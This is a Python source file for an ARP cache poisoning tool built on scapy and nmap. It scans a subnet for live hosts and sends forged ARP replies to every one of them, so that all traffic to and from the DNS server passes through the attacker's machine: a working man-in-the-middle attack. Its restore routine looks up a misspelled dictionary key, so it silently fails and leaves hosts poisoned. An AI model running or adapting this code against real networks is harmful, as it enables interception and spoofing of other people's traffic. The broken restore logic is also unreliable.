from scapy.all import *
import nmap


class Arp:
    nm = nmap.PortScanner()
    dns_mac = ''
    first_call = True

    def poison(self, machine_a_ip, machine_a_mac, machine_b_ip, machine_b_mac):
        # Poison machine A's ARP cache (tell machine B is at attacker's MAC)
        send(ARP(op=2, pdst=machine_a_ip, psrc=machine_b_ip, hwdst=machine_a_mac), verbose=False)
        # Poison machine B's ARP cache (tell machine A is at attacker's MAC)
        send(ARP(op=2, pdst=machine_b_ip, psrc=machine_a_ip, hwdst=machine_b_mac), verbose=False)
        if self.first_call:
            print("Poisoned host at " + machine_a_ip)

    def restore(self, machine_a_ip, machine_a_mac, machine_b_ip, machine_b_mac):
        # Broadcast 3 times machine B's correct MAC address
        send(ARP(op=2, pdst=machine_a_ip, psrc=machine_b_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=machine_b_mac), count=3, verbose=False)
        # Broadcast 3 times machine A's correct MAC address
        send(ARP(op=2, pdst=machine_b_ip, psrc=machine_a_ip, hwdst='ff:ff:ff:ff:ff:ff', hwsrc=machine_a_mac), count=3, verbose=False)

    def get_hosts(self, ip):
        if self.first_call:
            print("Obtaining list of alive hosts...")
        # Check if scan already occurred
        if not self.nm.all_hosts():
            # Ping scan to get all alive hosts
            self.nm.scan(ip, arguments='-sP')

        if self.first_call:
            print("Done! (" + str(len(self.nm.all_hosts())) + " found)")

    def poison_all(self, ip_range, dns_ip, dns_mac, first_call):
        self.first_call = first_call
        self.get_hosts(ip_range)
        for host in self.nm.all_hosts():
            try:
                self.poison(host, self.nm[host]['addresses']['mac'], dns_ip, dns_mac)
            except KeyError:
                continue
        # Return true if poisoning was successful
        return True

    def restore_all(self, ip_range, dns_ip, dns_mac):
        self.get_hosts(ip_range)
        for host in self.nm.all_hosts():
            try:
                self.restore(host, self.nm[host]['address']['mac'], dns_ip, dns_mac)
            except KeyError:
                continue

    def get_dns_mac(self, ip):
        if self.dns_mac is '':
            scanner = nmap.PortScanner()
            scanner.scan(ip, arguments='-sP')
            self.dns_mac = scanner[ip]['addresses']['mac']

        return self.dns_mac
